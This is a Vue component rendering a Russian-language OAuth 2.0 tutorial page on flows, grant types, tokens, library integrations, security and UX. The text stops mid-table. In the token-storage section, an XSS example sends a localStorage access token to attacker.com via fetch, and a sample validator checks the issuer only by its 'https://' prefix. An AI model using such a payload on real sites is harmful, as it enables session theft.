<script setup lang="ts">
import {onMounted, ref} from "vue"
import Prism from 'prismjs'
import 'prismjs/themes/prism-tomorrow.css'
import 'prismjs/components/prism-javascript.js'
import 'prismjs/components/prism-bash.js'
import 'prismjs/components/prism-http.js'

const basicFlowSnippet = `
// Основной процесс OAuth 2.0 - Authorization Code Flow

// Шаг 1: Пользователь нажимает "Войти через Google"
// Приложение перенаправляет на Authorization Server

const authUrl = 'https://accounts.google.com/o/oauth2/v2/auth'
const params = new URLSearchParams({
  client_id: 'YOUR_CLIENT_ID',
  redirect_uri: 'https://your-app.com/callback',
  response_type: 'code',                    // Запрашиваем authorization code
  scope: 'openid email profile',            // Какие данные нужны
  state: 'random_string_for_csrf_protection' // Защита от CSRF
})

// Redirect пользователя:
window.location.href = \`\${authUrl}?\${params}\`

// Шаг 2: Пользователь входит и дает разрешение
// Google перенаправляет обратно: https://your-app.com/callback?code=AUTH_CODE&state=...

// Шаг 3: Backend обменивает code на токены
const tokenUrl = 'https://oauth2.googleapis.com/token'
const response = await fetch(tokenUrl, {
  method: 'POST',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: new URLSearchParams({
    code: 'AUTH_CODE',
    client_id: 'YOUR_CLIENT_ID',
    client_secret: 'YOUR_CLIENT_SECRET',  // ⚠️ Только на backend!
    redirect_uri: 'https://your-app.com/callback',
    grant_type: 'authorization_code'
  })
})

const tokens = await response.json()
// {
//   access_token: 'ya29.a0AfH6...',
//   refresh_token: 'ya29.a0AfH6...',
//   expires_in: 3600,
//   token_type: 'Bearer',
//   id_token: 'eyJhbGciOiJSUzI1NiIs...'
// }

// Шаг 4: Используем access_token для API запросов
const userInfo = await fetch('https://www.googleapis.com/oauth2/v1/userinfo', {
  headers: {
    'Authorization': \`Bearer \${tokens.access_token}\`
  }
})
`

const componentsSnippet = `
// ============================================
// КОМПОНЕНТЫ OAUTH 2.0 АРХИТЕКТУРЫ
// ============================================

/**
 * 1. RESOURCE OWNER (Владелец ресурса)
 * - Пользователь, который владеет данными
 * - Может предоставить доступ к своим ресурсам
 */
const resourceOwner = {
  role: 'Пользователь',
  action: 'Дает согласие на доступ к данным',
  example: 'Вы, когда логинитесь через Google'
}

/**
 * 2. CLIENT (Клиент)
 * - Приложение, которое хочет получить доступ
 * - Делает запросы от имени пользователя
 */
const client = {
  role: 'Ваше приложение',
  types: {
    confidential: 'Backend приложение (может хранить секрет)',
    public: 'SPA/Mobile приложение (не может хранить секрет)'
  },
  credentials: {
    client_id: 'Публичный идентификатор',
    client_secret: 'Секретный ключ (только для confidential)'
  }
}

/**
 * 3. AUTHORIZATION SERVER (Сервер авторизации)
 * - Выдает токены после аутентификации
 * - Управляет разрешениями (scopes)
 */
const authorizationServer = {
  role: 'Сервер OAuth провайдера',
  endpoints: {
    authorization: '/oauth/authorize',  // Вход и согласие
    token: '/oauth/token',              // Обмен кода на токен
    revoke: '/oauth/revoke',            // Отзыв токена
    introspect: '/oauth/introspect'     // Проверка токена
  },
  examples: [
    'accounts.google.com',
    'github.com/login/oauth',
    'api.twitter.com/oauth2'
  ]
}

/**
 * 4. RESOURCE SERVER (Сервер ресурсов)
 * - Хранит защищенные данные
 * - Проверяет access token при запросах
 */
const resourceServer = {
  role: 'API сервер с данными',
  validates: 'Access Token в каждом запросе',
  examples: [
    'www.googleapis.com/drive/v3',  // Google Drive API
    'graph.microsoft.com/v1.0',     // Microsoft Graph API
    'api.github.com'                 // GitHub API
  ]
}

// Взаимодействие компонентов:
const oauthFlow = {
  step1: 'Client → Authorization Server: запрос авторизации',
  step2: 'Authorization Server → Resource Owner: вход и согласие',
  step3: 'Authorization Server → Client: authorization code',
  step4: 'Client → Authorization Server: обмен code на tokens',
  step5: 'Client → Resource Server: запрос данных с access_token',
  step6: 'Resource Server → Client: защищенные данные'
}
`

const grantTypesSnippet = `
// ============================================
// ТИПЫ ГРАНТОВ (GRANT TYPES) В OAUTH 2.0
// ============================================

/**
 * 1. AUTHORIZATION CODE FLOW
 * Самый безопасный, для веб-приложений с backend
 */
const authorizationCodeFlow = {
  useCase: 'Web приложения с серверной частью',
  security: '⭐⭐⭐⭐⭐ Высокая',
  clientType: 'Confidential Client',

  flow: {
    step1: 'Redirect на /authorize',
    step2: 'Получить code в callback',
    step3: 'Обменять code на tokens (на backend)',
    step4: 'Использовать access_token'
  },

  example: \`
    // Frontend
    window.location.href = '/oauth/authorize?client_id=...&response_type=code'

    // Backend получает code и обменивает
    const tokens = await exchangeCodeForTokens(code)
  \`
}

/**
 * 2. AUTHORIZATION CODE + PKCE
 * Для SPA и мобильных приложений (без client_secret)
 */
const pkceFlow = {
  useCase: 'SPA, React/Vue приложения, мобильные приложения',
  security: '⭐⭐⭐⭐ Хорошая',
  clientType: 'Public Client',

  pkce: {
    codeVerifier: 'Случайная строка 43-128 символов',
    codeChallenge: 'SHA256(codeVerifier) в base64url',
    method: 'S256'
  },

  example: \`
    // Генерируем PKCE пару
    const codeVerifier = generateRandomString(128)
    const codeChallenge = await sha256(codeVerifier)

    // Redirect с code_challenge
    const authUrl = '/authorize?' +
      'client_id=...' +
      '&code_challenge=' + codeChallenge +
      '&code_challenge_method=S256'

    // Обмен code на токены с code_verifier
    const tokens = await fetch('/token', {
      body: JSON.stringify({
        code,
        code_verifier: codeVerifier
      })
    })
  \`
}

/**
 * 3. IMPLICIT FLOW (УСТАРЕЛ - НЕ ИСПОЛЬЗОВАТЬ)
 * Возвращает токен сразу в URL
 */
const implicitFlow = {
  useCase: '❌ НЕ ИСПОЛЬЗОВАТЬ (небезопасно)',
  security: '⭐ Низкая',
  deprecated: true,
  reason: 'Токен в URL, нет refresh_token',
  replacement: 'Используйте Authorization Code + PKCE'
}

/**
 * 4. CLIENT CREDENTIALS FLOW
 * Для server-to-server взаимодействия
 */
const clientCredentialsFlow = {
  useCase: 'Backend сервисы, микросервисы, cron задачи',
  security: '⭐⭐⭐⭐ Хорошая',
  noUser: true, // Нет пользователя

  example: \`
    // Запрос токена напрямую
    const tokens = await fetch('/token', {
      method: 'POST',
      body: new URLSearchParams({
        grant_type: 'client_credentials',
        client_id: 'SERVICE_ID',
        client_secret: 'SERVICE_SECRET',
        scope: 'api:read api:write'
      })
    })
  \`
}

/**
 * 5. RESOURCE OWNER PASSWORD CREDENTIALS (НЕ РЕКОМЕНДУЕТСЯ)
 * Отправка username/password напрямую
 */
const passwordFlow = {
  useCase: '⚠️ Только для доверенных first-party приложений',
  security: '⭐⭐ Низкая',
  notRecommended: true,
  reason: 'Приложение видит пароль пользователя',

  onlyWhen: [
    'Миграция legacy систем',
    'First-party мобильное приложение',
    'Нет возможности использовать другие методы'
  ]
}

/**
 * 6. REFRESH TOKEN FLOW
 * Обновление истекшего access_token
 */
const refreshTokenFlow = {
  useCase: 'Получение нового access_token без повторного входа',

  example: \`
    // Когда access_token истек
    const newTokens = await fetch('/token', {
      method: 'POST',
      body: new URLSearchParams({
        grant_type: 'refresh_token',
        refresh_token: 'EXISTING_REFRESH_TOKEN',
        client_id: 'YOUR_CLIENT_ID'
      })
    })

    // Получаем новый access_token (и возможно новый refresh_token)
  \`
}
`

const tokenTypesSnippet = `
// ============================================
// ТИПЫ ТОКЕНОВ В OAUTH 2.0
// ============================================

/**
 * 1. ACCESS TOKEN
 * Ключ для доступа к защищенным ресурсам
 */
const accessToken = {
  purpose: 'Доступ к API',
  lifetime: 'Короткий (15 минут - 1 час)',
  format: 'JWT или opaque (случайная строка)',
  storage: 'Memory, httpOnly cookie (не localStorage!)',

  usage: \`
    // В заголовке запроса
    fetch('/api/user', {
      headers: {
        'Authorization': 'Bearer ya29.a0AfH6...'
      }
    })
  \`,

  security: [
    '⚠️ НЕ хранить в localStorage (XSS риск)',
    '✅ Хранить в httpOnly cookie или memory',
    '✅ Передавать только по HTTPS',
    '✅ Короткое время жизни'
  ]
}

/**
 * 2. REFRESH TOKEN
 * Долгоживущий токен для обновления access_token
 */
const refreshToken = {
  purpose: 'Получение нового access_token',
  lifetime: 'Долгий (дни, недели, месяцы)',
  format: 'Opaque (случайная строка)',
  storage: 'httpOnly cookie, secure storage',

  rotation: {
    description: 'При каждом использовании выдается новый refresh_token',
    oldTokenInvalidated: true,
    detectsTokenTheft: true
  },

  usage: \`
    // Автоматическое обновление при 401
    async function fetchWithAuth(url) {
      let response = await fetch(url, {
        headers: { 'Authorization': \`Bearer \${accessToken}\` }
      })

      if (response.status === 401) {
        // Access token истек, обновляем
        await refreshAccessToken()
        response = await fetch(url, {
          headers: { 'Authorization': \`Bearer \${newAccessToken}\` }
        })
      }

      return response
    }
  \`
}

/**
 * 3. ID TOKEN (OpenID Connect)
 * Информация о пользователе в формате JWT
 */
const idToken = {
  purpose: 'Аутентификация пользователя',
  protocol: 'OpenID Connect (расширение OAuth 2.0)',
  format: 'JWT (JSON Web Token)',

  structure: {
    header: { alg: 'RS256', typ: 'JWT' },
    payload: {
      iss: 'https://accounts.google.com',       // Issuer
      sub: '1234567890',                         // Subject (user ID)
      aud: 'YOUR_CLIENT_ID',                     // Audience
      exp: 1735689600,                           // Expiration
      iat: 1735686000,                           // Issued at
      email: 'user@example.com',
      email_verified: true,
      name: 'John Doe',
      picture: 'https://...'
    },
    signature: 'RSA signature'
  },

  validation: \`
    import jwt from 'jsonwebtoken'
    import jwksClient from 'jwks-rsa'

    // Проверка ID Token
    const client = jwksClient({
      jwksUri: 'https://www.googleapis.com/oauth2/v3/certs'
    })

    function getKey(header, callback) {
      client.getSigningKey(header.kid, (err, key) => {
        const signingKey = key.publicKey || key.rsaPublicKey
        callback(null, signingKey)
      })
    }

    jwt.verify(idToken, getKey, {
      audience: 'YOUR_CLIENT_ID',
      issuer: 'https://accounts.google.com'
    }, (err, decoded) => {
      if (err) throw new Error('Invalid token')
      console.log('User:', decoded)
    })
  \`
}

/**
 * СРАВНЕНИЕ ТОКЕНОВ
 */
const tokenComparison = {
  accessToken: {
    цель: 'Доступ к API',
    жизнь: 'Короткая',
    хранение: 'Memory/httpOnly cookie',
    передача: 'В каждом API запросе'
  },
  refreshToken: {
    цель: 'Обновление access_token',
    жизнь: 'Долгая',
    хранение: 'httpOnly cookie/secure DB',
    передача: 'Только на /token endpoint'
  },
  idToken: {
    цель: 'Информация о пользователе',
    жизнь: 'Короткая',
    хранение: 'Можно не хранить',
    передача: 'Используется для аутентификации'
  }
}
`

const implementationSnippet = `
// ============================================
// РЕАЛИЗАЦИЯ OAUTH 2.0 В REACT/VUE ПРИЛОЖЕНИИ
// ============================================

// === ВАРИАНТ 1: Auth0 (Рекомендуется для production) ===

// 1. Установка
// npm install @auth0/auth0-react

// 2. Настройка провайдера (React)
import { Auth0Provider } from '@auth0/auth0-react'

function App() {
  return (
    <Auth0Provider
      domain="your-domain.auth0.com"
      clientId="YOUR_CLIENT_ID"
      authorizationParams={{
        redirect_uri: window.location.origin,
        audience: "https://your-api.com",
        scope: "openid profile email"
      }}
      cacheLocation="memory"  // Безопасное хранение
      useRefreshTokens={true}
    >
      <YourApp />
    </Auth0Provider>
  )
}

// 3. Компонент входа
import { useAuth0 } from '@auth0/auth0-react'

function LoginButton() {
  const { loginWithRedirect, logout, user, isAuthenticated, isLoading } = useAuth0()

  if (isLoading) return <div>Loading...</div>

  return isAuthenticated ? (
    <div>
      <img src={user.picture} alt={user.name} />
      <h2>{user.name}</h2>
      <p>{user.email}</p>
      <button onClick={() => logout({
        logoutParams: { returnTo: window.location.origin }
      })}>
        Выйти
      </button>
    </div>
  ) : (
    <button onClick={() => loginWithRedirect()}>
      Войти через Auth0
    </button>
  )
}

// 4. Защищенные API запросы
import { useAuth0 } from '@auth0/auth0-react'

function ProtectedComponent() {
  const { getAccessTokenSilently } = useAuth0()

  const fetchProtectedData = async () => {
    try {
      const token = await getAccessTokenSilently()

      const response = await fetch('https://your-api.com/data', {
        headers: {
          Authorization: \`Bearer \${token}\`
        }
      })

      const data = await response.json()
      return data
    } catch (error) {
      console.error('Error fetching protected data:', error)
    }
  }

  return <button onClick={fetchProtectedData}>Загрузить данные</button>
}

// === ВАРИАНТ 2: Supabase Auth ===

// npm install @supabase/supabase-js

import { createClient } from '@supabase/supabase-js'

const supabase = createClient(
  'https://your-project.supabase.co',
  'your-anon-key'
)

// Вход через OAuth провайдера
async function signInWithGoogle() {
  const { data, error } = await supabase.auth.signInWithOAuth({
    provider: 'google',
    options: {
      redirectTo: 'https://your-app.com/auth/callback',
      scopes: 'email profile',
      queryParams: {
        access_type: 'offline',
        prompt: 'consent'
      }
    }
  })
}

// Получение пользователя
const { data: { user } } = await supabase.auth.getUser()

// Выход
await supabase.auth.signOut()

// === ВАРИАНТ 3: NextAuth.js (для Next.js) ===

// pages/api/auth/[...nextauth].js
import NextAuth from "next-auth"
import GoogleProvider from "next-auth/providers/google"
import GitHubProvider from "next-auth/providers/github"

export default NextAuth({
  providers: [
    GoogleProvider({
      clientId: process.env.GOOGLE_CLIENT_ID,
      clientSecret: process.env.GOOGLE_CLIENT_SECRET,
      authorization: {
        params: {
          prompt: "consent",
          access_type: "offline",
          response_type: "code"
        }
      }
    }),
    GitHubProvider({
      clientId: process.env.GITHUB_ID,
      clientSecret: process.env.GITHUB_SECRET
    })
  ],

  callbacks: {
    async jwt({ token, account }) {
      if (account) {
        token.accessToken = account.access_token
        token.refreshToken = account.refresh_token
      }
      return token
    },

    async session({ session, token }) {
      session.accessToken = token.accessToken
      return session
    }
  },

  session: {
    strategy: "jwt",
    maxAge: 30 * 24 * 60 * 60 // 30 days
  }
})

// Компонент
import { useSession, signIn, signOut } from "next-auth/react"

function Component() {
  const { data: session } = useSession()

  if (session) {
    return (
      <>
        Вошли как {session.user.email} <br />
        <button onClick={() => signOut()}>Выйти</button>
      </>
    )
  }

  return (
    <>
      <button onClick={() => signIn('google')}>
        Войти через Google
      </button>
      <button onClick={() => signIn('github')}>
        Войти через GitHub
      </button>
    </>
  )
}
`

const securitySnippet = `
// ============================================
// БЕЗОПАСНОСТЬ OAUTH 2.0
// ============================================

/**
 * CRITICAL: Где НЕ хранить токены
 */
const unsafeStorage = {
  localStorage: {
    vulnerable: 'XSS атаки',
    reason: 'JavaScript может прочитать',
    example: \`
      // ❌ ОПАСНО
      localStorage.setItem('access_token', token)

      // Атакующий может украсть:
      <script>
        fetch('https://attacker.com/?token=' + localStorage.getItem('access_token'))
      <\/script>
\`
},

sessionStorage: {
vulnerable: 'XSS атаки',
reason: 'Доступно из JavaScript',
sameAs: 'localStorage'
},

cookies: {
vulnerable: 'CSRF атаки (если без httpOnly)',
safe: 'httpOnly + Secure + SameSite',
example: \`
// ✅ БЕЗОПАСНО
Set-Cookie: access_token=...;
HttpOnly;        // Недоступно из JS
Secure;          // Только HTTPS
SameSite=Strict; // Защита от CSRF
Max-Age=3600
\`
}
}

/**
* Безопасное хранение токенов
*/
const safeTokenStorage = {
option1_memory: {
description: 'В переменной в памяти (React state)',
security: '⭐⭐⭐⭐⭐',
drawback: 'Теряется при перезагрузке',

example: \`
// React
const [accessToken, setAccessToken] = useState(null)

// При входе
const tokens = await login()
setAccessToken(tokens.access_token)

// При перезагрузке - используем refresh_token
useEffect(() => {
refreshAccessToken()
}, [])
\`
},

option2_httpOnlyCookie: {
description: 'httpOnly cookie на backend',
security: '⭐⭐⭐⭐⭐',
recommended: true,

backend: \`
// Express.js
app.post('/auth/callback', async (req, res) => {
const tokens = await exchangeCodeForTokens(req.body.code)

// Устанавливаем httpOnly cookies
res.cookie('access_token', tokens.access_token, {
httpOnly: true,
secure: true,
sameSite: 'strict',
maxAge: 3600000 // 1 час
})

res.cookie('refresh_token', tokens.refresh_token, {
httpOnly: true,
secure: true,
sameSite: 'strict',
maxAge: 2592000000 // 30 дней
})

res.json({ success: true })
})
\`,

frontend: \`
// Frontend - токены автоматически в cookies
fetch('/api/protected', {
credentials: 'include' // Отправляет cookies
})
\`
},

option3_bff: {
description: 'Backend for Frontend (BFF) паттерн',
security: '⭐⭐⭐⭐⭐',
bestFor: 'Enterprise приложения',

architecture: \`
[Browser] <--session cookie--> [BFF] <--access token--> [API]

- Frontend: только session ID в httpOnly cookie
- BFF: хранит и управляет OAuth токенами
- API: получает токены от BFF
\`
}
}

/**
* Защита от атак
*/
const securityMeasures = {
csrf_protection: {
threat: 'Cross-Site Request Forgery',
solution: 'state parameter',

implementation: \`
// Генерируем случайный state
const state = crypto.randomUUID()
sessionStorage.setItem('oauth_state', state)

// Отправляем в authorization request
const authUrl = '/authorize?state=' + state + '&...'

// Проверяем при возврате
const urlParams = new URLSearchParams(window.location.search)
const returnedState = urlParams.get('state')
const savedState = sessionStorage.getItem('oauth_state')

if (returnedState !== savedState) {
throw new Error('CSRF attack detected!')
}
\`
},

pkce_protection: {
threat: 'Authorization code interception',
solution: 'PKCE (Proof Key for Code Exchange)',
required: 'Для SPA и мобильных приложений',

implementation: \`
// 1. Генерируем code_verifier
function generateCodeVerifier() {
const array = new Uint8Array(32)
crypto.getRandomValues(array)
return base64UrlEncode(array)
}

// 2. Создаем code_challenge
async function generateCodeChallenge(verifier) {
const encoder = new TextEncoder()
const data = encoder.encode(verifier)
const hash = await crypto.subtle.digest('SHA-256', data)
return base64UrlEncode(new Uint8Array(hash))
}

// 3. Используем в auth flow
const verifier = generateCodeVerifier()
const challenge = await generateCodeChallenge(verifier)

sessionStorage.setItem('code_verifier', verifier)

// Authorization request
window.location.href = '/authorize?' +
'code_challenge=' + challenge +
'&code_challenge_method=S256'

// Token request
const tokens = await fetch('/token', {
method: 'POST',
body: JSON.stringify({
code,
code_verifier: sessionStorage.getItem('code_verifier')
})
})
\`
},

token_validation: {
idToken: \`
// Проверка ID Token (JWT)
import jwt from 'jsonwebtoken'

function validateIdToken(idToken, clientId) {
const decoded = jwt.decode(idToken, { complete: true })

// 1. Проверка audience
if (decoded.payload.aud !== clientId) {
throw new Error('Invalid audience')
}

// 2. Проверка expiration
if (decoded.payload.exp < Date.now() / 1000) {
throw new Error('Token expired')
}

// 3. Проверка issuer
if (!decoded.payload.iss.startsWith('https://')) {
throw new Error('Invalid issuer')
}

// 4. Проверка подписи (через JWKS)
return jwt.verify(idToken, getPublicKey(decoded.header.kid))
}
\`,

accessToken: \`
// Проверка Access Token на backend
app.use('/api', async (req, res, next) => {
const token = req.headers.authorization?.split(' ')[1]

if (!token) {
return res.status(401).json({ error: 'No token' })
}

try {
// Option 1: Introspection endpoint
const introspection = await fetch('https://oauth.com/introspect', {
method: 'POST',
body: new URLSearchParams({ token })
})
const result = await introspection.json()

if (!result.active) {
return res.status(401).json({ error: 'Invalid token' })
}

req.user = result
next()
} catch (error) {
res.status(401).json({ error: 'Token validation failed' })
}
})
\`
},

scope_validation: {
description: 'Проверка разрешений',

example: \`
// Middleware для проверки scope
function requireScope(...requiredScopes) {
return (req, res, next) => {
const tokenScopes = req.user.scope.split(' ')

const hasAllScopes = requiredScopes.every(
scope => tokenScopes.includes(scope)
)

if (!hasAllScopes) {
return res.status(403).json({
error: 'Insufficient permissions'
})
}

next()
}
}

// Использование
app.get('/api/admin',
requireScope('admin:read', 'admin:write'),
(req, res) => {
// Только с нужными scopes
}
)
\`
}
}
`

const uxSnippet = `
// ============================================
// ВЛИЯНИЕ OAUTH НА UX
// ============================================

/**
* ПОЛОЖИТЕЛЬНОЕ ВЛИЯНИЕ
*/
const positiveUX = {
singleSignOn: {
benefit: 'Один вход для многих сервисов',
example: 'Войти через Google работает везде',
userValue: 'Не нужно помнить много паролей',

implementation: \`
<button onClick={() => signIn('google')}>
<GoogleIcon />
Продолжить с Google
</button>

<button onClick={() => signIn('github')}>
<GitHubIcon />
Продолжить с GitHub
</button>
\`
},

fasterOnboarding: {
benefit: 'Быстрая регистрация',
traditional: '5-10 минут (форма + подтверждение email)',
oauth: '10-30 секунд (1 клик)',
conversionIncrease: '+30-50%',

bestPractice: \`
// Предзаполнение профиля из OAuth
const { user } = await signInWithGoogle()

// Автоматически создаем профиль
await createUserProfile({
email: user.email,
name: user.name,
avatar: user.picture,
emailVerified: true // Уже проверен провайдером
})
\`
},

trustAndSecurity: {
benefit: 'Пользователи доверяют известным брендам',
psychology: 'Google/GitHub badge = доверие',
security: 'Не нужно хранить пароли пользователей',

design: \`
<div className="oauth-buttons">
<button className="oauth-google">
  <GoogleIcon />
  Войти через Google
  <ShieldIcon /> {/* Индикатор безопасности */}
</button>

<p className="security-note">
  Мы не видим ваш пароль.
  Google гарантирует безопасность входа.
</p>
</div>
\`
},

seamlessExperience: {
benefit: 'Бесшовный опыт на всех устройствах',
feature: 'Silent authentication',

implementation: \`
// Автоматический вход при возврате
useEffect(() => {
const checkAuth = async () => {
try {
// Попытка silent auth
const session = await getSession({ prompt: 'none' })
if (session) {
setUser(session.user)
}
} catch (error) {
// Не вошли - показываем форму входа
}
}

checkAuth()
}, [])
\`
}
}

/**
* НЕГАТИВНОЕ ВЛИЯНИЕ И РЕШЕНИЯ
*/
const negativeUX = {
redirectFlow: {
problem: 'Пользователь покидает сайт',
impact: 'Может потерять контекст',

solution: {
saveState: \`
// Сохраняем состояние перед redirect
sessionStorage.setItem('return_to', window.location.pathname)
sessionStorage.setItem('cart', JSON.stringify(cart))

// После возврата восстанавливаем
const returnTo = sessionStorage.getItem('return_to')
const cart = JSON.parse(sessionStorage.getItem('cart'))

navigate(returnTo, { state: { cart } })
\`,

popup: \`
// Альтернатива: открыть OAuth в popup
function loginWithPopup() {
const popup = window.open(
authUrl,
'oauth',
'width=500,height=600'
)

// Слушаем сообщение от popup
window.addEventListener('message', (event) => {
if (event.data.type === 'oauth_success') {
handleAuthSuccess(event.data.tokens)
popup.close()
}
})
}
\`
}
},

consentScreen: {
problem: 'Экран разрешений может пугать',
impact: 'Отказ от входа',

solution: {
minimalScopes: \`
// Запрашивайте только необходимое
const scopes = [
'openid',    // Обязательный
'email',     // Только для связи
'profile'    // Имя и аватар
// ❌ НЕ запрашивайте лишнее
].join(' ')
\`,

explanation: \`
<div className="oauth-explainer">
<h3>Почему мы просим доступ?</h3>
<ul>
  <li>
    <MailIcon /> Email - для входа и уведомлений
  </li>
  <li>
    <UserIcon /> Профиль - для отображения имени
  </li>
</ul>

<p className="privacy">
  Мы не можем изменять ваши данные в Google.
  <Link to="/privacy">Политика конфиденциальности</Link>
</p>
</div>
\`
}
},

providerDependency: {
problem: 'Если провайдер недоступен - пользователь не войдет',
impact: 'Потеря доступа к аккаунту',

solution: {
multipleProviders: \`
// Предлагайте несколько вариантов входа
<div className="login-options">
<button onClick={() => signIn('google')}>
Google
</button>
<button onClick={() => signIn('github')}>
GitHub
</button>
<button onClick={() => signIn('email')}>
Email + пароль
</button>
</div>
\`,

accountLinking: \`
// Связывание нескольких методов входа
const linkAccount = async (provider) => {
const newAuth = await signIn(provider)

await fetch('/api/user/link-account', {
method: 'POST',
body: JSON.stringify({
userId: currentUser.id,
provider,
providerId: newAuth.providerAccountId
})
})

toast.success(\`\${provider} привязан к вашему аккаунту\`)
}
\`
}
},

privacy_concerns: {
problem: 'Пользователи беспокоятся о приватности',
impact: 'Отказ от использования OAuth',

solution: {
transparency: \`
<div className="privacy-first">
<h3>Ваша конфиденциальность</h3>

<div className="guarantee">
  <CheckIcon />
  <span>Мы не продаем ваши данные</span>
</div>

<div className="guarantee">
  <CheckIcon />
  <span>Мы не рассылаем спам</span>
</div>

<div className="guarantee">
  <CheckIcon />
  <span>Вы можете удалить аккаунт в любой момент</span>
</div>

<button onClick={showDataUsage}>
  Что мы делаем с вашими данными?
</button>
</div>
\`,

dataMinimization: \`
// Запрашивайте минимум данных
// Объясняйте, зачем нужны
// Давайте контроль пользователю

const [dataSharing, setDataSharing] = useState({
email_notifications: true,
marketing: false,
analytics: true
})
\`
}
}
}

/**
* ЛУЧШИЕ ПРАКТИКИ UX
*/
const uxBestPractices = {
clearCTA: \`
// ✅ Понятная кнопка
<button>Войти через Google</button>

// ❌ Непонятная
<button>Authorize with OAuth Provider</button>
\`,

loadingStates: \`
<button
  onClick={handleLogin}
  disabled={isLoading}
>
{isLoading ? (
<>
<Spinner />
Входим...
</>
) : (
<>
<GoogleIcon />
Войти через Google
</>
)}
</button>
\`,

errorHandling: \`
try {
await signIn('google')
} catch (error) {
if (error.code === 'popup_closed') {
// Пользователь закрыл окно - ничего не делаем
} else if (error.code === 'access_denied') {
toast.error('Вход отменен. Попробуйте снова.')
} else {
toast.error('Ошибка входа. Попробуйте другой способ.')
}
}
\`,

returnToOrigin: \`
// Возвращаем на исходную страницу
const returnTo = sessionStorage.getItem('returnTo') || '/'
router.push(returnTo)
\`
}
`

const highlightedBasicFlow = ref('')
const highlightedComponents = ref('')
const highlightedGrantTypes = ref('')
const highlightedTokenTypes = ref('')
const highlightedImplementation = ref('')
const highlightedSecurity = ref('')
const highlightedUX = ref('')

onMounted(() => {
highlightedBasicFlow.value = Prism.highlight(basicFlowSnippet, Prism.languages.javascript, 'javascript')
highlightedComponents.value = Prism.highlight(componentsSnippet, Prism.languages.javascript, 'javascript')
highlightedGrantTypes.value = Prism.highlight(grantTypesSnippet, Prism.languages.javascript, 'javascript')
highlightedTokenTypes.value = Prism.highlight(tokenTypesSnippet, Prism.languages.javascript, 'javascript')
highlightedImplementation.value = Prism.highlight(implementationSnippet, Prism.languages.javascript, 'javascript')
highlightedSecurity.value = Prism.highlight(securitySnippet, Prism.languages.javascript, 'javascript')
highlightedUX.value = Prism.highlight(uxSnippet, Prism.languages.javascript, 'javascript')
})

</script>

<template>
  <v-app>
    <v-main>
      <v-container>
        <v-row justify="center">
          <v-col lg="10">
            <h1 class="text-h4 font-weight-bold mb-6">
              OAuth 2.0: Авторизация в современных веб-приложениях
            </h1>

            <p class="font-weight-regular mb-6">
              <b>OAuth 2.0</b> — это отраслевой стандарт протокола авторизации, который позволяет приложениям
              получать ограниченный доступ к ресурсам пользователя на другом сервисе без передачи пароля.
              Это основа для "Войти через Google/GitHub/Facebook" и многих современных API.
            </p>

            <h2 class="text-h5 font-weight-bold mb-3">Что такое OAuth и для чего он нужен?</h2>

            <v-row class="mb-6">
              <v-col cols="12" md="6">
                <v-card class="pa-4 h-100">
                  <div class="d-flex align-center mb-3">
                    <v-icon size="large" color="primary" class="mr-2">mdi-shield-check</v-icon>
                    <h3 class="text-h6 font-weight-bold">Основное назначение</h3>
                  </div>
                  <ul class="pl-4">
                    <li><strong>Делегирование доступа</strong> без передачи пароля</li>
                    <li><strong>Single Sign-On (SSO)</strong> — один вход на все сервисы</li>
                    <li><strong>Безопасный API доступ</strong> через токены</li>
                    <li><strong>Ограниченные разрешения</strong> (scopes)</li>
                  </ul>
                </v-card>
              </v-col>
              <v-col cols="12" md="6">
                <v-card class="pa-4 h-100">
                  <div class="d-flex align-center mb-3">
                    <v-icon size="large" color="success" class="mr-2">mdi-check-circle</v-icon>
                    <h3 class="text-h6 font-weight-bold">Преимущества</h3>
                  </div>
                  <ul class="pl-4">
                    <li><strong>Безопасность:</strong> пароли не передаются</li>
                    <li><strong>Удобство:</strong> быстрая регистрация/вход</li>
                    <li><strong>Контроль:</strong> пользователь управляет доступом</li>
                    <li><strong>Стандартизация:</strong> единый протокол</li>
                  </ul>
                </v-card>
              </v-col>
            </v-row>

            <h2 class="text-h5 font-weight-bold mb-3">Базовый процесс OAuth 2.0</h2>
            <pre class="mb-8 pa-6 rounded-lg custom-code"><code v-html="highlightedBasicFlow"></code></pre>

            <h2 class="text-h5 font-weight-bold mb-3">Архитектура OAuth: компоненты и взаимодействие</h2>
            <pre class="mb-8 pa-6 rounded-lg custom-code"><code v-html="highlightedComponents"></code></pre>

            <h2 class="text-h5 font-weight-bold mb-3">Схема взаимодействия компонентов</h2>
            <v-card class="mb-8 pa-6">
              <div class="oauth-flow-diagram">
                <div class="flow-step">
                  <v-icon size="x-large" color="primary">mdi-account</v-icon>
                  <div class="step-label">Resource Owner<br>(Пользователь)</div>
                </div>
                <v-icon>mdi-arrow-right</v-icon>
                <div class="flow-step">
                  <v-icon size="x-large" color="info">mdi-application</v-icon>
                  <div class="step-label">Client<br>(Ваше приложение)</div>
                </div>
                <v-icon>mdi-arrow-right</v-icon>
                <div class="flow-step">
                  <v-icon size="x-large" color="success">mdi-server-security</v-icon>
                  <div class="step-label">Authorization Server<br>(OAuth провайдер)</div>
                </div>
                <v-icon>mdi-arrow-right</v-icon>
                <div class="flow-step">
                  <v-icon size="x-large" color="warning">mdi-database</v-icon>
                  <div class="step-label">Resource Server<br>(API с данными)</div>
                </div>
              </div>
            </v-card>

            <h2 class="text-h5 font-weight-bold mb-3">Типы грантов (Grant Types)</h2>
            <pre class="mb-8 pa-6 rounded-lg custom-code"><code v-html="highlightedGrantTypes"></code></pre>

            <h2 class="text-h5 font-weight-bold mb-3">Сравнение Grant Types</h2>
            <v-table density="comfortable" class="mb-8">
              <thead>
              <tr>
                <th class="text-left font-weight-bold">Grant Type</th>
                <th class="text-left font-weight-bold">Использование</th>
                <th class="text-left font-weight-bold">Безопасность</th>
                <th class="text-left font-weight-bold">Client Secret</th>
                <th class="text-left font-weight-bold">Рекомендация</th>
              </tr>
              </thead>
              <tbody>
              <tr>
                <td><b>Authorization Code</b></td>
                <td>Web приложения с backend</td>
                <td class="text-success">⭐⭐⭐⭐⭐</td>
                <td class="text-success">Да</td>
                <td class="text-success">✅ Рекомендуется</td>
              </tr>
              <tr>
                <td><b>Auth Code + PKCE</b></td>
                <td>SPA, мобильные приложения</td>
                <td class="text-success">⭐⭐⭐⭐</td>
                <td class="text-error">Нет</td>
                <td class="text-success">✅ Рекомендуется для SPA</td>
              </tr>
              <tr>
                <td><b>Implicit</b></td>
                <td>-</td>
                <td class="text-error">⭐</td>
                <td class="text-error">Нет</td>
                <td class="text-error">❌ Deprecated</td>
              </tr>
              <tr>
